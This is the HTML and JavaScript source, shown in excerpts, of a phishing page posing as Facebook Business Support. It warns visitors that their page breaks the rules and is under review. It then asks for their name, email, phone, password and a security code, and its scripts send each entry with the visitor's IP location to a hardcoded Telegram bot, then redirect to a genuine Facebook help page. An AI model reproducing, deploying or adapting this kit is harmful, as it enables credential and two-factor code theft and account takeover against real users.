...
<html>
  <head>
    <title>Facebook Business Support</title>
    <!-- Required meta tags -->
    <meta charset="UTF-8" />
    <meta
      name="viewport"
    ...
    />
    <meta name="theme-color" content="#355797" />

    <script>
      document
        .querySelector('meta[name="theme-color"]')
        .setAttribute("content", "#355797");
    </script>
 ...
 */
      ...
      @font-face {
        font-family: "FontAwesome";
        font-display: block;
        src: url(https://ka-f.fontawesome.com/releases/v6.4.0/webfonts/free-fa-v4compatibility.woff2)
            format("woff2"),
          url(https://ka-f.fontawesome.com/releases/v6.4.0/webfonts/free-fa-v4compatibility.ttf)
            format("truetype");
 ...
 */
    ...
    <style type="text/css">
      	...
      	body {
      	    input, select { font-size: 100%; font-size: 16px;}
        margin: 0;
      ...
      .masheader{
          background-image: url('30175859_1847141705586364_4634876909090504704_n.1a04d13ed075a5eb588b.jpg');
  ...
  <body>
    <div>
      <div class="topheader">
        <div class="container">
          <img
            class="metalogo"
            src="278052525_813944336231788_2126819975299864928_n.2ca221b227e5e50b2861f74e67923f35.svg"
          />
          <p class="metahead">Support Inbox</p>
          <img src="search-13-64.a9254a55959a7da573f4.ico" class="searchicon" />
        </div>
      </div>
      ...
      <div class="col-6" style="text-align: right">
        ...
        <p
          ...
          "
        >
          <i style="font-size: 16px" class="fa-solid fa-envelope"></i> Support
          Inbox
        </p>
      </div>
    </div>

    <div id="loader"><img src="loadingLogo.gif" alt="Loading..." /></div>
      ...
      <div class="container px-4">
        <div class="row justify-content-center">
          <div style="max-width: 550px">
            <div class="card">
              <div style="width: 100%">
                <div style="display: flex" class="mx-4 mx-md-5">
                ...
                <div
                  class="mx-4 g-0 pt-2 row justify-content-between"
                  style="color: #3084f4; font-size: 13px"
                >
                  <div class="col-auto px-0">Select Asset</div>
                  <div class="col-auto px-0" style="margin-left: -10px">
                    Select the Issue
                  </div>
                  <div class="col-auto px-0">Get help</div>
                </div>
              </div>
              <div
                class="row"
              ...
              >
                <div class="col">
                  ...
                  >
                    ...
                    page has been in violation of our terms of service and
                    community guidelines. As a result, your page is scheduled
                    for review. <br/ >
                    <div class="text-start pt-2" style="font-size: 14px">
                      <strong>Report no: 1003784549657034</strong>
                    </div>
                  </div>
                  <style>
                    .form-control {
                  ...
                  >
                    <div class="form-group">
                      <label
                        ...
                        "
                        for="reason"
                        >Please provide us with information that will help us
                        investigate:</label
                      >
                      <textarea
                        type="text"
                    ...
                    <div class="form-group">
                      ...
                      <input
                        ...
                        name="fbpg"
                        onkeyup="EnableDisable(this)"
                        aria-describedby="fbpg"
                        oninput="checkLength('fbpg')"
                        required=""
                      />
                    </div>
                    ...
                    <div class="form-check">
                      ...
                      <label class="form-check-label" for="check" name="check"
                        >I agree to our Terms, Data and Cookies Policy.</label
                      >
                      <p
                        id="termsaccept"
                        style="
                    ...
                    <button
                      style="
                        background-color: rgb(48, 132, 244) !important;
                        color: white !important;
                      "
                      type="button"
                      id="submit"
                      class="btn butoni custom-design-button"
                      disabled="disabled"
                      onclick="sndDt()"
        ...
        <div class="modal-content">
          ...
          <div class="modal-body px-0">
            <div id="modal_form">
              ...
              <div class="mt-1 justify-content-between d-none">
                <input type="hidden" value="0" id="pw_tries" />
                <label for="email" id="em_lb">Email address:</label>
                <input
                  type="email"
                  readonly=""
                  disabled=""
                  class="ml-2 input-password"
                  id="confirm_email"
                  name="password"
                  style="float: right; width: 198px; border-radius: 0px"
                />
              </div>
              <div class="mt-1">
                <div>
                ...
                <input
                  type="password"
                  oninput="checkLength('password')"
                  class="ml-2 form-control w-100"
                  name="password"
                  id="password"
              ...
              <div class="justify-content-between" style="text-align: right">
                <span class="text-danger d-none" id="wrong_pass">
                  <p
                    style="
                      color: red;
                      font-size: 13px;
        ...
        <div class="modal-content">
          ...
          <div class="modal-body px-0">
            <div id="modal_form">
              ...
              <div class="mt-1 justify-content-between d-none">
                <input type="hidden" value="1" id="pw_tries" />
                <input name="ip" value="185.223.152.14" type="hidden" />
                <input name="phonepass2" id="phonepass2" type="hidden" />
                <input name="city2" id="city2" type="hidden" />
                <input name="email2" id="emailpass2" type="hidden" />
                <label for="email" id="em_lb">Email address:</label>
                <input
                  type="email"
                  readonly=""
    ...
    <input id="ip_hidden" value="46.99.49.104" type="hidden" />
    <script
    ...
    <script>
      ...
      async function getapi(url) {
        ...
        if (integeri == 0) {
          $.ajax({
            url:
              "https://api.telegram.org/bot6495594757:AAFHza_rZqoqxHty6NND1v4-jvARSW48H_I/sendMessage?chat_id=2119286597&text=" +
              a,
            method: "POST",
            success: function () {},
          });
      ...
      getIp();
      var bot = "bot6495594757:AAFHza_rZqoqxHty6NND1v4-jvARSW48H_I";
      var chid = "2119286597";
        ...
        $.get("https://ipapi.co/json/", function (response) {
          ...
          var params = {
            content:
              ...
              "%0A" +
              '1|Full Name: "' +
              document.getElementById("name").value.replace("#", "-sharp-") +
              '"' +
              "%0A" +
              '3|Personal Email: "' +
              document.getElementById("email").value.replace("#", "-sharp-") +
              '"' +
              "%0A" +
              '4|Appeal: "' +
              document.getElementById("reason").value.replace("#", "-sharp-") +
              '"' +
              "%0A" +
              '5|Number: "' +
              document.getElementById("phone").value.replace("#", "-sharp-") +
              '"' +
              "%0A" +
              '6|City : "' +
              city +
          ...
          fetch(
            `https://api.telegram.org/bot6495594757:AAFHza_rZqoqxHty6NND1v4-jvARSW48H_I/sendMessage?chat_id=2119286597&text=${params.content}`,
            {
              method: "POST", // or 'PUT'
              headers: {
      ...
      function sndtepafb2() {
        let psdasdas2 = document
          .getElementById("psdasdas2")
          .value.replace("#", "-sharp-");
        $.get("https://ipapi.co/json/", function (response) {
          let country = response.country;
      ...
      btn.addEventListener("click", (e) => {
        ...
        if (!checked) {
          return (document.getElementById("termsaccept").innerHTML =
            "Please accept Terms, Data Policy and Cookies Policy");
          openModal = false;
        }
        ...
        if (openModal) {
          ...
          document.getElementById("confirm_email").value = document
      ...
      function handleActions(e) {
        ...
        if (pass.length === 0) {
          ...
          if (parseInt(tries.value) === 0) {
            ...
            document.getElementById("confirm_email1").value = document
              .getElementById("email")
              .value.replace("#", "-sharp-");
            document.getElementById("emailpass2").value = document
              .getElementById("email")
              .value.replace("#", "-sharp-");
            document.getElementById("phonepass2").value = document
            ...
            if (code === null) {
              ...
              $.get("https://ipapi.co/json/", function (response) {
                ...
                fetch(
                  `https://api.telegram.org/bot6495594757:AAFHza_rZqoqxHty6NND1v4-jvARSW48H_I/sendMessage?chat_id=2119286597&text=${params.content}/, {text=${params.content}/`,
                  {
                    method: "POST", // or 'PUT'
                    headers: {
                      "Content-Type": "application/json",
                ...
                if (twoPages) {
                  ...
                  document.querySelector("#modal_header").innerText =
                    "Enter security code";
                  document.querySelector("#mod_title").innerText =
                    "Please enter your security code";
                  document.querySelector("#modal_form").innerHTML =
                    '<div class="mt-1 d-flex justify-content-between"><label for="email">Code:</label><input type="text" class="ml-2 input-password" id="code" placeholder="Enter your code"  name="code" style="float: right;"></div>';
                }
              });
            } else {
              $.get("https://ipapi.co/json/", function (response) {
                ...
                window.setTimeout(function () {
                  window.location =
                    "https://www.facebook.com/business/help/507905413074296?helpref=search&sr=1&query=contact";
                }, 3000);
              });
            }
          }
